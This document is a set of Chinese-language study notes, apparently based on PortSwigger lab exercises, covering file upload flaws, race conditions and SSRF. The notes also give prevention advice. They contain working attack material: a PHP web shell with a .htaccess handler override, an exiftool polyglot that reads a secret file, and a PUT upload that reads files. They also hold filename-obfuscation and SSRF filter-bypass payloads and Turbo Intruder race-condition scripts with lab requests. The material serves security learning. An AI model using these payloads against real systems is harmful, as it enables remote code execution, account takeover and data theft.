例如假设 apache 服务器允许上传 `.htaccess` 类型的文件，攻击者上传了如下内容：

```
AddType application/x-httpd-php .jpg
```

攻击者将如下内容伪装成 jpg 类型文件上传：

```
<?php echo system($_GET['command']); ?>
```

由于 apache 会将目录下 `.htaccess` 文件中规则替换掉全局规则，这会导致将 .jpg 类型文件作为 .php 发送给解释器执行。



#### 混淆文件扩展名

即使黑名单设置的很详尽，也可能通过混淆技术被绕过。简单的示例：假设黑名单代码是区分大小写的，且未能检查出 `exploit.pHp` 是 `.php` 文件，就会被绕过。还有很多种类型：

* 提供多个扩展，取决于解析扩展名的算法，例如 `exploit.php.jpg` 
* 尾字符，有些组件会忽略结尾的 `.` 或者空格，例如 `exploit.php.` 
* 利用 URL 编码，例如 `exploit%2Ephp`
* 在文件结尾前添加分号或者URL编码的 null 字符，如果黑名单验证使用 php、java 等语言，但服务器处理文件又用的 C、C++ 等偏底层语言，文件名结尾的处理可能产生差异，例如 `exploit.asp;.jpg` 或者 `exploit.asp%00.jpg`
* 尝试使用多字节 unicode 编码，例如使用 UTF8 解析文件名 `xC0 x2E`, `xC4 xAE` 或者 `xC0 xAE` 可能被转换为 `x2E`
* 有些措施会剥离危险的扩展名，例如 `.php` ，但如果没有递归处理文件，可能会被 `exploit.p.phphp` 这种绕过





### 文件内容验证缺陷

一些对安全要求较高的应用会校验文件内容，例如 jpg 等图片文件有属性：尺寸大小，而如果攻击者上传 .php 之类的文件伪装则不存在此类属性从而被拒绝。但可以通过修改文件元属性等方式绕过检测。  

例如 exiftool，下面示例是以 shell.jpeg 为源文件，向元数据的 comment 中插入php代码数据获取密钥，生成 polyglot.php 

```
.\exiftool.exe -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" shell.jpeg -o polyglot.php
```





### 文件上传条件竞争

现代 web 框架对上面几类攻击都有了更强的防御能力，通常会将文件上传到一个临时目录或者沙箱中，然后随机化文件名并加以验证，确认安全后再进行转移到目标位置。  

但有时候开发人员仍需要独立于框架之外，实现一些文件上传的处理逻辑，由此可能会带来条件竞争的问题，使得攻击者绕开这些验证防御。  

例如，网站上传文件到文件系统中，然后利用杀毒软件之类工具对该文件进行验证，未通过则删除文件，即使通常只有几秒甚至几毫秒的存在时间，黑客仍有可能执行到该文件。  

一般此类漏洞极为隐蔽，黑盒测试中很难发现，除非找到泄露的源码。



portswigger 实验中漏洞代码：

```php
<?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?>
```

只要在 checkViruses 方法执行期间访问了上传的文件，文件内容仍会被执行。  

官方给的实验答案（手快一些也可以开两个浏览器页面，手工上传后访问测试）：

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```







## 无远程代码执行的文件上传漏洞

前面都是可以上传远程执行代码相关的漏洞，还有一些虽然不能触发远程代码执行漏洞，但也可以通过其它方式被利用：

* 上传恶意的客户端执行脚本：攻击者在上传的 HTML、SVG 图片等资源中加入`<script>` 之类内容，用于 XSS 攻击。
* 利用文件解析或处理的漏洞，例如常见的 XML、doc、xls 等，用于 XXE 攻击。





## 利用 PUT 上传

有些 web 服务器或者框架默认配置支持了 PUT 请求，这样即使没有 web 页面用于上传文件，也会存在潜在的通过 PUT 请求上传文件漏洞。

示例：

```http
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

一般可以给不同后端端点发送 `OPTIONS` 请求探测是否支持 `PUT` 方法。  



## 预防文件上传漏洞

文件上传相关最佳实践：

* 文件后缀白名单优于黑名单
* 检查文件名中不包含 `../` 之类的可以穿透目录的字符串
* 重命名文件以避免覆盖现有文件
* 文件被验证安全之前不上传到服务器文件系统中
* 优先使用成熟框架来处理文件上传功能，尽量避免自己写相关验证机制





# Race Conditaions 条件竞争

参考白皮书：https://portswigger.net/research/smashing-the-state-machine

## 概念

条件竞争漏洞是一种常见的漏洞类型，和业务逻辑缺陷密切相关，当网站处理并发请求又没有充分考虑，就会发生条件竞争。这种情况可能导致多个线程同时和一些数据交互，从而产生冲突，在程序中产生非预期行为。条件竞争攻击是利用精心设计的请求来有意制造这种冲突，并将非预期行为用于恶意目的。  

示例：礼品卡兑换，多个请求利用并发冲突同时被使用

![image-20261111183449344](../upload/2026-07-06-PortSwigger_Server_Side/image-20261111183449344.png)

冲突可能发生的时间段被称为“race window(竞争窗口)”，例如可能是两次与数据库交互之间的几十毫秒。条件竞争的影响也取决于具体场景。  

示例：扣除余额

```
正常流程（串行）：
请求 A → 读取余额（100）→ 扣款 100 → 写入余额（0）
请求 B → 读取余额（0）→ 扣款失败（余额不足）
  ↓
结果正确

竞态条件（并发）：
请求 A → 读取余额（100）
请求 B → 读取余额（100）    ← 同时读到 100
请求 A → 扣款 100 → 写入余额（0）
请求 B → 扣款 100 → 写入余额（0）  ← 两次扣款都成功，但实际只扣了一次
  ↓
结果错误：用户花了 100 却买了 200 的东西
```

竞争窗口时序：

```
时间线：
t0: 线程 A 读取数据
t1: 线程 B 读取数据        ← race window 开始
t2: 线程 A 写入数据
t3: 线程 B 写入数据        ← race window 结束
  ↓
race window = t1 到 t2 之间的时间
  ↓
窗口越短，攻击者越难精确命中
窗口越长，攻击越容易成功
```

竞争窗口的时间通常很短，通常需要精准命中才能触发，Burp 中的 single-packet attack(单包攻击)可以让多个请求同时到达，避免延迟、抖动等问题。





## 限额超限导致的条件竞争

最著名的条件竞争就是业务逻辑导致的限额超限。  

例如，一个购物应用允许用户订单中使用一张一次性优惠券到订单来获取折扣，应用程序可能需要如下步骤：

* 检查用户是否未使用过该优惠券
* 应用折扣到订单
* 记录到数据库中，标记用户已经使用过该优惠券

如果用户后续再次尝试使用同一张优惠券，就会被拒绝，大致流程如下：

![image-20261112112902462](../upload/2026-07-06-PortSwigger_Server_Side/image-20261112112902462.png)

现在考虑用户还未使用优惠券的场景下，在应用优惠券的过程同时发起了两个请求：

![image-20261112113028803](../upload/2026-07-06-PortSwigger_Server_Side/image-20261112113028803.png)

如上图所示，应用程序会进入一个**temporary sub-state(临时子状态)**，一个它在请求处理完成之前进入，然后又退出的状态。在这种情况下，子状态在服务器开始处理第一个请求时开始，在它更新数据库以标记已经使用过优惠券为止。这里引入了一个很小的**race window(竞争窗口)**，在这个窗口时间内可以任意次数的反复领取折扣。  

有很多种此类的变形攻击：

* 多次消费礼品卡
* 评分一个产品多次
* 取款或者转账超过账户余额的限制
* 重用一次性验证码
* 绕过反暴力破解限制

限额超限属于“time-of-check to time-of-end”(TOCTOU)这种缺陷漏洞的子类。



### 使用 Burp Repeater 探测和利用限额超限

探测和利用限额超限条件竞争相对简单。抽象的过程只需要做到：

* 识别出一个单次使用或者有速率限制的 endpoint，存在某种安全影响或者用途
* 快速连续的发送多个请求到该 endpoint，观察是否可以突破限额

主要挑战是发送请求的时机，至少两个请求导致条件竞争产生冲突，这个窗口通常是毫秒级甚至更短。  

甚至你同一时间发送多个请求，但实践中存在很多不可控和不可预测的因素影响服务器处理这些请求的次序。  

![image-20261112115256798](../upload/2026-07-06-PortSwigger_Server_Side/image-20261112115256798.png)

为了减少**network jitter(网络抖动)**的影响，BurpSuite 在 2023.9 版本之后增加了一些功能：

* 对于 HTTP/1，使用经典的 **最后字节同步（last-byte synchronization）**技术
* 对于 HTTP/2，使用**单包攻击（single-packet attack）**技术

单包攻击可以使用单个 TCP 数据包完成 20-30 个请求，消除网络抖动的干扰。  

网络抖动的影响：

```
攻击者发送请求 A 和 B（几乎同时）：
请求 A → 网络路径 1 → 延迟 10ms → 到达服务器
请求 B → 网络路径 2 → 延迟 50ms → 到达服务器
  ↓
实际到达时间差 40ms
  ↓
竞态窗口可能只有几毫秒 → 窗口对不齐 → 攻击失败
```

最后字节同步技术：

```
原理：
1. 先发送所有请求的头部（不含最后一个字节）
2. 服务器收到头部后，等待请求体的最后字节
3. 攻击者同时发送所有请求的“最后字节”
  ↓
所有请求在同一时刻“完成”
  ↓
服务器几乎同时开始处理它们
```

单包攻击技术：

```
原理：
1. 将 20-30 个 HTTP/2 请求打包进同一个 TCP 数据包
2. 单个 TCP 包一次性到达服务器
3. 服务器在同一时刻收到所有请求
  ↓
网络抖动完全消失（因为只有一个包）
  ↓
所有请求几乎同时进入竞态窗口
```

![image-20261112120421994](../upload/2026-07-06-PortSwigger_Server_Side/image-20261112120421994.png)



这种发送大量请求有助于缓解**内部延迟**，也称为**服务端抖动**，在初始发现阶段很有用。





### 使用 Turbo Intruder 插件探测和利用限额超限

这个插件需要一定的 Python 基础，更适合较复杂的攻击，比如需要多次重试、按时序分阶段请求、大量请求等等。  

要在 Turbo Intruder 中使用单包攻击：

* 确保目标支持 HTTP/2
* 设置请求引擎为 `engin=Engine.BURP2` 和 `concurrentConnections=1` 配置
* 在排队请求时，使用 `engine.queue()` 方法的 `gate` 参数将它们分配到命名门（named gate）来进行分组
* 要发送指定组的所有请求，使用`engine.openGate()`方法打开对应的门

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    # queue 20 requests in gate '1'
    for i in range(20):
        engine.queue(target.req, gate='1')
    
    # send all requests in gate '1' in parallel
    engine.openGate('1')
```

还可以参考插件默认目录下的 `race-single-packet-attack.py` 模板示例。  





## 隐藏的多步骤序列

在实践中，单个请求后面可能隐藏启动多个步骤序列，使得应用程序经过多个状态，这些状态被称为子状态（sub-state）。  

如果能找到一个或者多个与同一数据进行交互的 endpoint，就可以利用这些子状态，尝试暴露出更多多步骤工作流中常见逻辑缺陷导致的时间敏感的变体漏洞。  



示例用户登录 MFA 验证伪代码：

```
    session['userid'] = user.userid
    if user.mfa_enabled:
    session['enforce_mfa'] = True
    # generate and send MFA code to user
    # redirect browser to MFA code entry form
```

上面示例是一个单个请求跨度内的多步骤序列。其中会经过一个子状态，用户暂时拥有一个有效的已登录会话，但 MFA 尚未被强制执行。攻击者就可以发送一个登录请求，再附加一个对敏感的、需要认证的 endpoint 的请求。  

在实际环境中，还需要更多方法论来有效识别、利用存在漏洞的应用程序。   



## 方法论

![image-20261112174955669](../upload/2026-07-06-PortSwigger_Server_Side/image-20261112174955669.png)



### 预测潜在冲突点

测试每个 endpoin 是不现实的，在明确目标后，可以根据一些因素缩减 endpoint 范围：

* 确定该 endpoint 安全是否至关重要
* 是否存在任何的冲突点。制造一个成功的冲突，需要两个或者更多的请求触发同一个数据记录，例如，一个密码重置的实现：

![image-20261112221919404](../upload/2026-07-06-PortSwigger_Server_Side/image-20261112221919404.png)

第一行示例中，两条并发的请求操作两行不同的记录，不太可能产生冲突。第二行示例中却会冲突，导致不同的请求修改同一个记录。  





### 寻找线索

要寻找线索，首先需要基准来测试 endpoint 在正常条件下的行为。  

例如可以先在 Burp Repeater 中使用按顺序发送组（单独连接）的方式发送一组请求，作为正常行为的基准线，然后再以单包攻击（HTTP/1 可以使用最后字节同步）的形式发送一组请求。  

对比在基准测试中观察到的任何偏离，包括一个或者多个 response 的变化，但要注意**二阶效应（sencond-order effects）**。  

| 效应类型                 | 示例                                           | 为什么重要                             |
| :----------------------- | :--------------------------------------------- | :------------------------------------- |
| **一阶效应（直接响应）** | 两个请求都返回 200，或者一个 200 一个 500      | 最直观，但可能被忽略                   |
| **二阶效应（间接变化）** | 收到了**两封**密码重置邮件                     | 响应可能看起来正常，但后台状态被改变了 |
| **二阶效应（行为变化）** | 之后访问某个页面，发现状态异常（如余额多扣了） | 需要事后检查，不能在响应里直接看到     |



```
步骤 1：基准测试
  发送请求组（串行）→ 记录每个响应的状态码、长度、内容
  ↓
步骤 2：并发测试
  发送同一组请求（并行，单包攻击）→ 记录每个响应
  ↓
步骤 3：对比
  逐项对比：状态码是否不同？长度是否不同？内容是否不同？
  ↓
步骤 4：检查二阶效应
  查看邮箱、查看数据库状态、查看后续页面行为
  ↓
步骤 5：判断
  如果有任何偏离 → 可能是竞态条件 → 进一步验证
  如果完全一致 → 可能没有竞态条件 → 换端点或换时序
```







### 概念验证

试着理解发生的事情，移除多余的请求，然后再确保能够复现该影响。  

高级条件竞争可能会导致不同寻常且独特的原语（primitives），因此影响通常不总是显而易见的，将每个条件竞争视为一种结构性弱点（structual weakness），而不是孤立的漏洞。  





## 多 endpoint 条件竞争

同时向多个 endpoint 发送请求是一种很容易直观理解的条件竞争形式。  

例如在线商店购物车缺陷：将商品加入购物车，付款，然后在强制跳转到订单确认页面之前，再向购物车添加更多商品。这种漏洞的一个变体可能发生在支付验证或者订单确认的过程中，订单状态机可能如下：

![image-20261113101510890](../upload/2026-07-06-PortSwigger_Server_Side/image-20261113101510890.png)

这种情况下就存在支付验证和订单最终确认的竞争窗口期间，向购物车添加更多商品。  



### 校准竞争窗口

但在实际测试条件竞争时，即使使用单包技术完全同时发送所有请求，也可能遇到要校准每个请求的竞争窗口时机问题。  

![image-20261113102112240](../upload/2026-07-06-PortSwigger_Server_Side/image-20261113102112240.png)

主要因素有：

* 网络架构引起的延迟。例如前后端分离架构，每次前端新建立到后端服务器的连接可能会有延迟，协议转换也会增加时间差异。
* endpoint 特定处理过程引起的延迟。不同 endpoint 的处理逻辑不同，过程存在差异。





### 连接预热

后端连接延迟通常不会干扰条件竞争攻击，因为延迟对所有请求都存在。  

需要使用一些方法来区分连接延迟和 endpoint 特定处理过程所造成的延迟。可以使用一个或者多个无关紧要的请求来预热连接，查看是否可以平滑的处理后续请求。  

例如在 Repeater 中，每组请求第一个请求设置为对主页的请求，后续再添加所需请求，使用按顺序发送组的选项。  

如果第一个请求延迟较长，但剩下请求在一个较短时间窗口被处理，就可以忽略该延迟。  



但是如果在单 endpoint 使用单包技术时，仍然看到不一致的 response 时间，说明后端延迟干扰了攻击。可以尝试使用 Turbo Intruder 在主要攻击之前发送一些预热请求来绕开此问题。  



```
未预热：
请求 1（/pay）→ 前端建立新连接 → 后端处理（20ms）
请求 2（/cart/add）→ 前端建立新连接 → 后端处理（1ms）
  ↓
两个请求的到达时间差 = 连接建立延迟 + 处理延迟差

预热后：
请求 0（GET /）→ 前端建立连接（预热）
请求 1（/pay）→ 复用连接 → 后端处理（20ms）
请求 2（/cart/add）→ 复用连接 → 后端处理（1ms）
  ↓
连接建立延迟被消除 → 只剩处理延迟差
```





### 利用速率或资源限制

如果使用连接预热后没有明显的区别，还可以尝试一些其他方法。  

使用 Turbo Intruder 可以引入一个短暂的客户端延迟。但这样可能需要将攻击拆分到多个 TCP 包中，无法使用单包攻击技术。在高抖动目标上，无法稳定工作。  

![image-20261113115707118](../upload/2026-07-06-PortSwigger_Server_Side/image-20261113115707118.png)

相反可以利用一些安全特性，例如触发限速来让延迟和抖动稳定。  

web 服务器通常有一些策略，限制发送太快或者太多的请求。可以发送大量请求来故意触发速率或者资源限制，尝试引起一个合适的服务器端延迟，让所有单包攻击在一个相对稳定的延迟下展开。  



![image-20261113120001756](../upload/2026-07-06-PortSwigger_Server_Side/image-20261113120001756.png)

```
目标：需要让某个请求延迟执行，以便与另一个请求对齐

方法：
发送大量虚拟请求 → 触发服务器的速率限制
  ↓
服务器开始延迟处理后续请求（如每秒只处理 10 个）
  ↓
攻击者的真实请求被“卡”在队列中
  ↓
通过控制虚拟请求的数量，可以精确控制延迟时间
  ↓
真实请求在期望的时间点被处理 → 窗口对齐
```











## 单 endpoint 条件竞争

对单个 endpoint 并行发送多个不同值的请求，有时会导致影响很大的条件竞争。  

假设一个密码重置机制，存储用户ID、重置 token到用户的 session 中。并行发送两个请求，分别使用不同的用户名，可能会导致下面潜在的冲突： 

![image-20261112230354111](../upload/2026-07-06-PortSwigger_Server_Side/image-20261112230354111.png)

注意上图最终状态：

- `session['reset-user'] = victim`
- `session['reset-token'] = 1234`

包含受害者用户id 的重置 token 发送给了攻击者。不过要使得上面攻击成功，各个请求的操作需要按照正确顺序执行，实际上可能要尝试很多次才能获取想要的结果。  

很多基于邮件的操作，或者需要邮箱验证的功能，通常都是条件竞争能发挥的地方。   



portswigger 实验：  

分别登录两个浏览器获取两个 cookie，再访问 /my-account 页面获取不同 csrf，增加两个类似如下请求到同一个组：

```http
POST /my-account/change-email HTTP/2
Host: 0adf0026031255bc80991282006d007d.web-security-academy.net
Cookie: session=2pRV1v9Lh6eAIfraSgv1fheYMXuBeAdK
Content-Length: 111

email=6wiener@exploit-0a8c003d0338555280c61126019000e2.exploit-server.net&csrf=9PAAETNavBB4ig5ZfNxxia8FdNWuE0zM
```

```http
POST /my-account/change-email HTTP/2
Host: 0adf0026031255bc80991282006d007d.web-security-academy.net
Cookie: session=8tsRKIUuj9cTrr2BepSnWcJV8ajLWgeo
Content-Length: 67

email=carlos@ginandjuice.shop&csrf=hjZz1zj4xc4ylkw2XeBFwseFeP9f93YF
```

点击并行发送：

![image-20261113151544890](../upload/2026-07-06-PortSwigger_Server_Side/image-20261113151544890.png)

然后访问lab中的邮箱，如果邮箱中没有收到 body 中是 carlos@ginandjuice.shop 的邮件，就多尝试几次：

![image-20261113151758562](../upload/2026-07-06-PortSwigger_Server_Side/image-20261113151758562.png)





## 基于会话的锁定机制

一些框架会尝试使用某种形式的请求锁防止数据损坏。例如 PHP 原生的会话处理模块每次仅处理一个会话中的单个请求。识别出这种行为很重要，因为可能会掩盖一些很容易利用的漏洞。如果你注意到发送的所有请求都被顺序处理，可以尝试使用不同的会话令牌分别发送每个请求。  



```
正常情况（无会话锁）：
同一 session 的请求 A 和 B 并发到达
  ↓
两个请求同时处理 → 可能碰撞 → 竞态条件可利用

有会话锁（如 PHP 默认）：
同一 session 的请求 A 和 B 并发到达
  ↓
服务器把 B 放入队列，等 A 处理完再处理 B
  ↓
请求被“串行化” → 没有并发 → 碰撞不可能发生
  ↓
攻击者误以为“没有竞态条件”
```





## 部分构建的条件竞争

许多应用通过多个步骤创建对象，这就可能引入一个临时中间状态，在该状态下对象是可以被利用的。  

例如，注册用户时，应用程序可能使用两条独立的 SQL 语句在数据库中创建用户并设置其 API 密钥。这里有一个很小的窗口期，在此期间用户存在，但其 API 密钥未初始化。  

这种行为留下了隐患：当注入一个空值，该值与数据库中返回的空值做对比，例如空字符串、JSON 中的 null。  

框架中通常允许使用非标准语法传入数组或者其他非字符串结构数据结构。例如 PHP 中：

* `param[]=foo` 等价于 `param = ['foo']`
* `param[]=foo&param[]=bar` 等价于 `param = ['foo', 'bar']`
* `param[]` 等价于 `param = []`

Ruby、Rails 允许提供一个有 key 无 value 的查询或者 POST 请求，`parm[key]` 将会导致如下服务端对象：

```ruby
params = {"param"=>{"key"=>nil}}
```

这意味着，在竞争窗口期间，可以发送如下请求来绕过认证：

```http
GET /api/user/info?user=victim&api-key[]= HTTP/2
Host: vulnerable-website.com
```

注：类似场景也有可能使用哈希密码而非 API 密钥，这样就需要注入一个使哈希摘要和未初始化值匹配的值。  



```
示例说明：
用户注册流程（两步）：
步骤 1：INSERT INTO users (username, password) VALUES ('victim', '...')
步骤 2：UPDATE users SET api_key = 'random_key' WHERE username = 'victim'
  ↓
在步骤 1 和步骤 2 之间：
- 用户记录已存在
- api_key 字段是 NULL（未初始化）
  ↓
这就是“部分构造”的中间状态


============== 利用未初始化的值 ==============
正常 API 请求：
GET /api/user/info?user=victim&api-key=abc123
  ↓
服务器比较：api-key 是否等于数据库中的 api_key？
  ↓
如果相等 → 放行

攻击请求（在竞态窗口内）：
GET /api/user/info?user=victim&api-key[]=
  ↓
PHP 解析：api-key = []（空数组）
  ↓
服务器比较：[] 是否等于 NULL？
  ↓
在 PHP 的宽松比较中：[] == NULL → true
  ↓
放行 → 获取了 victim 的信息


============== 密码哈希变体 =================
API 密钥场景：
未初始化值 = NULL
攻击者注入 = 空数组/空值 → 匹配 NULL

密码场景：
未初始化值 = NULL（或某个哈希值）
攻击者注入 = 一个字符串，其哈希值等于未初始化值的哈希
  ↓
例如：如果未初始化值是 NULL，其哈希是 hash(NULL)
攻击者需要找到 X，使得 hash(X) = hash(NULL)
  ↓
这很难，但某些情况下可行（如空密码的哈希是已知的）

```



portswigger 相关 lab 实验：

我的尝试：

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    host = "0a2100610328c4e280bc4989009b0066.web-security-academy.net"

    for i in range(1, 101): 
        username = "wienerr" + str(i)

        # 注册请求
        register_req = "POST /register HTTP/2\r\n" + \
                       "Host: " + host + "\r\n" + \
                       "Cookie: phpsessionid=e4sSP8IeEq7AoE1bR3PrUMvXvEYKatZh\r\n" + \
                       "Content-Type: application/x-www-form-urlencoded\r\n\r\n" + \
                       "csrf=YM4PeycGuf3HXayuznwZIxTL1hXzf0Hp&username=" + username + "&email=wienerrrr%40ginandjuice.shop&password=peter"

        # 确认请求
        confirm_req = "POST /confirm?token[]= HTTP/2\r\n" + \
                      "Host: " + host + "\r\n" + \
                      "Cookie: phpsessionid=xM84F4zEL8uvwgGurCaeZ2gL7h4vrNuB\r\n" + \
                      "Content-Length: 0\r\n\r\n"

        gate_name = 'race' + str(i)
        engine.queue(register_req, gate=gate_name)
        engine.queue(confirm_req, gate=gate_name)
        engine.openGate(gate_name)


def handleResponse(req, interesting):
    table.add(req)
```

答案：

```python

def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a2100610328c4e280bc4989009b0066.web-security-academy.net
Cookie: e4sSP8IeEq7AoE1bR3PrUMvXvEYKatZh
Content-Length: 0

'''
    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'User' + currentAttempt
    
        # queue a single registration request
        engine.queue(target.req, username, gate=currentAttempt)
        
        # queue 50 confirmation requests - note that this will probably sent in two separate packets
        for i in range(50):
            engine.queue(confirmationReq, gate=currentAttempt)
        
        # send all the queued requests for this attempt
        engine.openGate(currentAttempt)

def handleResponse(req, interesting):
    table.add(req)
    
```





## 时间敏感的攻击

有时可能找不到竞争条件，但以精确的时序投递请求仍然可以揭示出其它漏洞。  

例如，当使用高精度的时间戳生成安全令牌，而不是随机化的字符串。这种情况下，有可能为两个不同的用户触发两次密码重置，而这两次使用相同的令牌，只需要对请求进行计时，使的生成相同的时间戳。  



```
正常的密码重置令牌：
随机字符串：a8f3k2m9x7q1...
  ↓
每个用户、每次重置都是不同的 → 无法预测

时间戳生成的令牌：
用户 A：重置时间 = 1700000000123（毫秒）
用户 B：重置时间 = 1700000000123（毫秒）
  ↓
如果两次重置发生在同一毫秒 → 令牌相同
  ↓
攻击者利用相同的令牌，重置两个用户的密码
```



portswigger 实验，使用 Repeater 组并行发起两个请求，为了避免单个会话串行处理分别获取两个 cookie 和 csrf 值，前面再添加一个 GET 请求进行预热：  

预热请求：

```http
GET /forgot-password HTTP/2
Host: 0afa000f0342891280abb71e006d0005.web-security-academy.net

```

请求1：

```http
POST /forgot-password HTTP/2
Host: 0afa000f0342891280abb71e006d0005.web-security-academy.net
Cookie: phpsessionid=sfMmr0pxNB929A57l6cUjizbj1H6Los5
Content-Length: 53

csrf=YAE4yqHh9ygfeTSxoGTQQ4yMT0Z0H0bR&username=carlos
```

请求2：

```http
POST /forgot-password HTTP/2
Host: 0afa000f0342891280abb71e006d0005.web-security-academy.net
Cookie: phpsessionid=XhfEJAcFoUdYR1WCmV9dktbEZkGiwi4p
Content-Length: 53

csrf=VUKYbMvgddoePGPYcJ0tPtAtMQncVJp9&username=wiener
```

然后在邮箱中点击重置链接，替换参数中用户名为 carlos，如果可以正常弹出重置窗口说明成功，否则要再尝试几次。  





## 预防

当单个请求使得应用程序经过不可见的子状态时，理解和防御变得很难。有一些策略消除敏感 endpoint 中的子状态：

* 避免混合使用不同存储位置的数据。

* 敏感 endpoint 并发处理数据时，要确保状态改变时的一致性。例如使用单个数据库事务检查支付金额和是否和购物车金额匹配。

* 作为深度防御机制，利用数据存储的完整性和一致性，例如字段的唯一性约束。

* 不要尝试使用一个数据存储层来保护另一个。例如会话层不适合防护数据库层的条件竞争。

  * ```
    错误做法：
    用 Session 锁防止数据库并发
      ↓
    Session 锁只能保证同一会话的请求串行
      ↓
    但攻击者可以用不同会话并发请求 → Session 锁失效
      ↓
    数据库仍然被并发访问 → 限额超限仍然发生
    
    正确做法：
    在数据库层面使用事务/唯一约束
      ↓
    数据库自己保证并发安全
      ↓
    不依赖外部的 Session 锁
    ```

* 确保会话框架内部处理会话的一致性。单独更新一些会话变量而不是批量更新可能有很大危险性，ORM 中也是一样。

  * ```
    # 危险做法（单独更新）
    session['userid'] = user.id        # 步骤 1
    session['enforce_mfa'] = True      # 步骤 2
      ↓
    步骤 1 和步骤 2 之间：userid 有值，enforce_mfa 没有 → 子状态
      ↓
    竞态条件可乘之机
    
    # 安全做法（批量更新）
    session.update({
        'userid': user.id,
        'enforce_mfa': True
    })
      ↓
    原子操作，没有中间状态
    ```

* 一些架构中，可能更适合服务端无状态化，相反的，将状态加密后推送到客户端存储。例如 JWT，但 JWT 也有自身的风险。









# Server-side request forgery(SSRF) 服务端请求伪造

服务端请求伪造漏洞是指攻击者可以通过服务器连接到非预期位置发起请求。可能连接到服务器所在基础设施内网，获取敏感数据，甚至某些场景下可以执行任意命令。  

通常是通过本地环回地址 127.0.0.1 、localhost 之类的地址发起请求。  



## 常见攻击



### 针对服务器本身

示例，一个购物程序向后端查询库存通过如下请求：

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

服务器通过向指定 URL 请求并将结果返回给客户端，假如存在一个管理页面 /admin 仅允许本地访问，攻击者修改请求将获取该页面内容：

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```



应用程序允许或者隐式地信任本地请求，主要出于以下常见原因：

* 访问控制位于应用程序前面地组件，应用程序设计、定位处于架构中可信任的位置
* 灾备原因，允许本地机器无认证情况下访问管理
* 管理系统与主应用程序使用不同端口，且未对外暴露

出与以上及类似的原因，应用程序服务器信任来自本地的请求，就导致了 SSRF  



### 针对其它后端系统

示例，内网管理系统为 http://192.168.0.68/admin ，允许来自局域网请求，攻击者就可以提交如下请求获取管理页面 ：

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```





## 绕过常见防御

有些常见预防 SSRF 的手段也可以被绕过。  

### 黑名单输入过滤

一些应用使用黑名单阻止来自 `127.0.0.1` 、 `localhost` 之类的请求，或者敏感 URLs，下列方法可以进行尝试绕过：

* 其它代表 `127.0.0.1` 的形式，例如：十进制 `2130706433`、八进制 `017700000001` 、简写形式 `127.1`
* 注册自己的域名，配置解析为 `127.0.0.1` 
* 混杂不同编码字符串编码尝试绕过黑名单
* 尝试不同的协议，例如修改 http 为 https



### 白名单输入过滤

一些应用使用白名单，只允许匹配白名单中值的输入。但过滤器采用的算法不同，就会产生差异。URL 规范中包含的一些特性在实现或验证时会被忽视：

* 在主机名之前使用 `@` 符号嵌入凭证，例如  `https://expected-host:fakepassword@evil-host` 
* 使用 `#` 字符，例如 `https://evil-host#expected-host`
* 利用 DNS 解析，将匹配值以前缀形式放到解析中，例如 `https://expected-host.evil-host` 
* 对部分或全部字符进行 URL 编码，混淆解析，如果实现过滤器的代码处理 URL 和执行 HTTP 请求的代码不同会尤其有用。多重编码，有些服务器会递归解码收到的 URL，会导致差异



实验示例：  

过滤器拦截了 127.0.0.1 ，仅允许来自 `stock.weliketoshop.net` 的请求，尝试使用 `@` 可以接收没有返回拦截信息：

```http
http://username@stock.weliketoshop.net/
```

继续尝试加入 `#` 字符，提示被拦截，使用 URL 编码 `%23` 也被拦截，：

```http
http://localhost:80#@stock.weliketoshop.net/
```

再使用双重编码修改为 `%2523` 可以通过过滤器，其中 `%25` 为  `%` 的编码，加入后缀 URL 通过实验：

```http
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```





### 重定向跳转

一些应用中包含了重定向跳转，可能会被利用发起 SSRF，例如：`/product/nextProduct?currentProductId=6&path=http://evil-user.net` 跳转到 `http://evil-user.net`   

下面请求虽然是来自信任主机，但重定向跳转可能被篡改以访问其它内网应用：

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

  



## 盲 SSRF

当应用程序被诱导发起 SSRF，但 SSRF 的响应内容不会返回到客户端，就属于盲 SSRF。  

